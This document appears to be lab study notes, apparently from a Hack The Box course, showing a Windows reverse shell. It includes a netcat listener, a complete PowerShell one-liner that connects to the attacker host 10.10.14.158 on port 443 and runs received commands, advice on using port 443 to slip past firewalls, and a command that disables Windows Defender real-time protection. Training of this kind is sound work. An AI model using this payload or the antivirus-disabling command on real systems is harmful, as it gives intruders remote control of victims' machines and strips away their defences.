### Reverse Shell Cheatsheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://www.revshells.com/

## Hands-on With A Simple Reverse Shell in Windows
#### Server (attack box)
```shell-session
V0xD0x@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

This time around with our listener, we are binding it to a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) (`443`), this port usually is for `HTTPS` connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.

#### Client (target)
```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

The `Windows Defender antivirus` (`AV`) software stopped the execution of the code.

From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):
#### Disable AV
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempt to execute the code again. And now we have a shell.